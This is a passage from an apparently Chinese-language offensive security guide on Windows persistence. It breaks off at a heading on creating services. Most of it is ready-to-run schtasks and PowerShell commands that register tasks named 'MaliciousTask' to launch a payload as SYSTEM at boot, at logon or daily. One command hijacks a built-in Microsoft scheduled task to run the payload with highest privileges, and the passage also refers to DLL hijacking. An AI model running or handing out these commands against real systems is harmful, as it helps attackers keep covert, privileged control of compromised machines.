### Windows持久化

#### DLL劫持

参考[DLL劫持](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Readme.md#dll%E5%8A%AB%E6%8C%81)

#### 计划任务

```bash
schtasks /create /tn "MaliciousTask" /tr "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /sc ONSTART /ru SYSTEM
schtasks /query /TN MaliciousTask /XML
schtasks /create /tn "MaliciousTaskDaily" /tr "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /sc DAILY /st 09:00 /ru SYSTEM
```

PowerShell:

```bash
$Action = New-ScheduledTaskAction -Execute "C:\malicious.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
$Settings = New-ScheduledTaskSettingsSet
$Settings.ExecutionTimeLimit = "PT0S"
Register-ScheduledTask -TaskName "MaliciousTaskLogon" -Action $Action -Trigger $Trigger -User "SYSTEM" -Settings $Settings
```

```bash
schtasks /delete /TN "MaliciousTask" /F
Unregister-ScheduledTask -TaskName "MaliciousTask" -Confirm:$false
```

```bash
SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\Users\Administrator\Desktop\test\payload\file\hi.exe" /RL HIGHEST /RU SYSTEM /ENABLE
```

#### 创建服务
